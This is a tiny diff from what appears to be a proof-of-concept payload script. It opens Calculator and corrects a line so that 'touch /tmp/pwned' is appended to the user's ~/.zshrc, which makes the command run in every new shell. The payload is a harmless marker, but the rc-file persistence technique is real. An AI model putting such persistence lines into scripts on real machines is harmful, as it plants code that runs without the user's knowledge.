@@ -2,4 +2,4 @@
 
 open -a calculator
 
-echo "touch /tmp/pwned" >> ~/.zsh
+echo "touch /tmp/pwned" >> ~/.zshrc
